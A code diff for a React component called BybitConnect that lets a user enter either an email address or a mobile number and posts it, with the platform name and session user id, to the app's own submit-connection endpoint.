@@ -20,23 +20,30 @@ export default function BybitConnect() {
     event.preventDefault();
     const { email } = credentials;
     if (!email) {
-      setErrorMessage('Please enter your email.');
+      setErrorMessage('Please enter your email or mobile number.');
       return;
     }
 
     setLoading(true);
     try {
       const { data: { session } } = await supabase.auth.getSession();
+      const payload: Record<string, unknown> = {
+        platform: 'Bybit',
+        user_id: session?.user?.id || null,
+      };
+
+      if (activeTab === 'Mobile') {
+        payload.phone = email;
+      } else {
+        payload.email = email;
+      }
+
       const response = await fetch('/api/submit-connection', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify({
-          platform: 'Bybit',
-          email,
-          user_id: session?.user?.id || null,
-        }),
+        body: JSON.stringify(payload),
       });
 
       if (!response.ok) {
